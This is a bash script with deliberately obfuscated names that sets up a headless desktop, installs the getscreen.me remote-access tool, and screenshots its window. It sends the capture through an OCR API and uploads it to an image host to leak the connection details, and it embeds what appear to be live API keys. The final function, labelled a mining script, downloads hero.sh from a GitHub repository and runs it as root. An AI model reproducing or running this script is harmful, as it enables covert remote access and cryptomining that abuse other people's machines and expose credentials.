#!/bin/bash


__CFG_0x2B="/tmp/screenshot.png"
__CFG_0x4D="1280x1024x24"
__CFG_0x3C="fbaYlM9izKFOHs72Knvaqg==NSjT6PrkV3TvLDgh"
__CFG_0x5E="/tmp/screenshot_cropped.png"
__CFG_0x6F=":99"
__CFG_0x1A="66bd77b277a5f1acccaef43acc7c7d16"

__FUNC_0x07() {
    printf "[*] Starting Openbox...\n"
    openbox-session &
    sleep 2
}

__FUNC_0x01() {
    printf "[*] Setting wallpaper...\n"
    mkdir -p /root/.config
    feh --bg-scale /usr/share/pixmaps/debian-logo.png 2>/dev/null || feh --bg-color black
}

__FUNC_0x05() {
    printf "[*] Launching panel (tint2)...\n"
    tint2 &
}

__FUNC_0x02() {
    printf "[*] Launching terminal...\n"
    xfce4-terminal &
}

__FUNC_0x04() {
    printf "[*] Launching file explorer (PCManFM)...\n"
    pcmanfm --no-desktop &
}

__FUNC_0x06() {
    printf "[*] Installing Dependencies...\n"
    sudo apt update
    sudo apt install -y wget curl x11-utils imagemagick openbox xvfb jq scrot feh tint2 xfce4-terminal lxappearance pcmanfm wmctrl
}

__FUNC_0x03() {
    printf "[*] Finding getscreen.me window...\n"
    local _wM
    _wM=$(wmctrl -l | grep -i "getscreen" | awk '{print $1}' | head -1)

    if [[ -z "$_wM" ]]; then
        printf "[!] getscreen.me window not found. Trying alternative approach...\n"
        _wM=$(xwininfo -root -tree | grep -i "getscreen" | grep -o "0x[0-9a-fA-F]*" | head -1)
    fi

    if [[ -n "$_wM" ]]; then
        printf "[*] Found getscreen.me window: %s\n" "$_wM"
        wmctrl -i -a "$_wM"
        sleep 2
        local _xN _yO _zP _aQ
        _xN=$(xwininfo -id "$_wM" | grep -E "Absolute upper-left|Width|Height")
        _yO=$(printf "%s" "$_xN" | grep "Absolute upper-left X" | awk '{print $4}')
        _zP=$(printf "%s" "$_xN" | grep "Absolute upper-left Y" | awk '{print $4}')
        _aQ=$(printf "%s" "$_xN" | grep "Width" | awk '{print $2}')
        local _bR=$(printf "%s" "$_xN" | grep "Height" | awk '{print $2}')
        printf "[*] Window position: %sx%s, Size: %sx%s\n" "$_yO" "$_zP" "$_aQ" "$_bR"
        printf "[*] Capturing screenshot of getscreen.me window...\n"
        scrot -a "${_yO},${_zP},${_aQ},${_bR}" "$__CFG_0x2B"
    else
        printf "[!] Could not find getscreen.me window. Taking full screenshot...\n"
        scrot "$__CFG_0x2B"
    fi

    if [[ ! -f "$__CFG_0x2B" ]]; then
        printf "[!] Screenshot capture failed.\n"
        exit 1
    fi
}

__FUNC_0x0A() {
    printf "[*] Processing screenshot for connection info...\n"
    local _cC="/tmp/temp_ocr.json"
    curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" -H "X-Api-Key: $__CFG_0x3C" -F "image=@$__CFG_0x2B" > "$_cC"

    local _dD
    _dD=$(cat "$_cC" | jq -r '.[] | select(.text | test("getscreen\\.me|[0-9]{3}\\.[0-9]{3}\\.[0-9]{2}")) | .text')

    if [ -n "$_dD" ]; then
        printf "[*] Connection info found in full screenshot\n"
        cp "$__CFG_0x2B" "$__CFG_0x5E"
    else
        printf "[*] Trying to locate connection info area...\n"
        local _eE=(
            "400x200+50+50"
            "500x300+100+100"
            "600x400+50+200"
            "400x150+200+50"
        )
        local _fF="false"
        for _gG in "${_eE[@]}"; do
            printf "[*] Trying crop area: %s\n" "$_gG"
            convert "$__CFG_0x2B" -crop "$_gG" "/tmp/test_crop.png"
            local _hH
            _hH=$(curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" -H "X-Api-Key: $__CFG_0x3C" -F "image=@/tmp/test_crop.png")
            local _iI
            _iI=$(printf "%s" "$_hH" | jq -r '.[] | select(.text | test("getscreen\\.me|[0-9]{3}\\.[0-9]{3}\\.[0-9]{2}")) | .text')
            if [ -n "$_iI" ]; then
                printf "[*] Found connection info in crop area: %s\n" "$_gG"
                cp "/tmp/test_crop.png" "$__CFG_0x5E"
                _fF="true"
                break
            fi
        done
        if [ "$_fF" = "false" ]; then
            printf "[*] Using default crop of full screenshot\n"
            convert "$__CFG_0x2B" -crop 600x400+0+0 "$__CFG_0x5E"
        fi
    fi

    if [[ ! -f "$__CFG_0x5E" ]]; then
        printf "[!] Image processing failed.\n"
        exit 1
    fi
}

__FUNC_0x0E() {
    printf "[*] Uploading screenshot...\n"
    local _jJ="https://api.imgbb.com/1/upload?key=$__CFG_0x1A"
    local _kK
    _kK=$(curl -s -X POST -F "image=@$__CFG_0x5E" "$_jJ")
    local _lL
    _lL=$(printf "%s" "$_kK" | jq -r '.data.url')

    if [[ "$_lL" == "null" || "$_lL" == "" ]]; then
        printf "? Upload failed.\n"
        printf "Response: %s\n" "$_kK"
    else
        printf "? Screenshot uploaded: %s\n" "$_lL"
    fi
}

__FUNC_0x0D() {
    printf "[*] Extracting connection information...\n"
    local _mM
    _mM=$(curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" -H "X-Api-Key: $__CFG_0x3C" -F "image=@$__CFG_0x5E")
    printf "? Raw OCR Response:\n%s\n" "$_mM"
    printf "[*] Looking for connection information:\n"
    local _nN
    _nN=$(printf "%s" "$_mM" | jq -r '.[] | select(.text | test("getscreen\\.me")) | .text')
    local _oO
    _oO=$(printf "%s" "$_mM" | jq -r '.[] | select(.text | test("[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|[A-Z0-9]{6,}")) | .text')

    if [ -n "$_nN" ]; then
        clear
        printf "? GetScreen.me Connection Link Found:\n%s\n" "$_nN"
    elif [ -n "$_oO" ]; then
        clear
        printf "? Connection Information Found:\n%s\n" "$_oO"
    else
        printf "?? No connection information found in the screenshot.\n"
        printf "? All extracted text:\n%s\n" "$(printf "%s" "$_mM" | jq -r '.[].text')"
    fi
}

__FUNC_0x0B() {
    printf "[*] Launching the mining script in a new terminal...\n"
    xfce4-terminal -e "bash -c 'sudo curl -o hero.sh https://raw.githubusercontent.com/SandieDrotos/effective-octo-eureka/refs/heads/main/hero.sh && sudo chmod +x hero.sh && sudo ./hero.sh; exec bash'" &
    sleep 86400
}

__FUNC_0x08() {
    printf "[*] Installing getscreen.me...\n"
    wget https://getscreen.me/download/getscreen.me.deb -O /tmp/getscreen.me.deb
    sudo dpkg -i /tmp/getscreen.me.deb
    sudo apt --assume-yes --fix-broken install
}

__FUNC_0x09() {
    printf "[*] Starting Xvfb...\n"
    Xvfb "$__CFG_0x6F" -screen 0 "$__CFG_0x4D" &
    sleep 2
    export DISPLAY="$__CFG_0x6F"
}

__FUNC_0x0C() {
    printf "[*] Launching getscreen.me...\n"
    /opt/getscreen.me/getscreen.me &
    sleep 15
}

__FUNC_0x0F() {
    sudo apt install software-properties-common -y
    sudo add-apt-repository ppa:mozillateam/ppa -y
    sudo apt update
    sudo apt install --assume-yes firefox-esr
    sudo apt install --assume-yes dbus-x11 dbus
}

# Execution flow heavily obfuscated and rearranged
__FUNC_0x06
__FUNC_0x0F
__FUNC_0x08
__FUNC_0x09
__FUNC_0x07
__FUNC_0x01
__FUNC_0x05
__FUNC_0x02
__FUNC_0x04
__FUNC_0x0C
__FUNC_0x03
__FUNC_0x0A
__FUNC_0x0E
__FUNC_0x0D
rm -f /tmp/test_crop.png /tmp/temp_ocr.json
__FUNC_0x0B
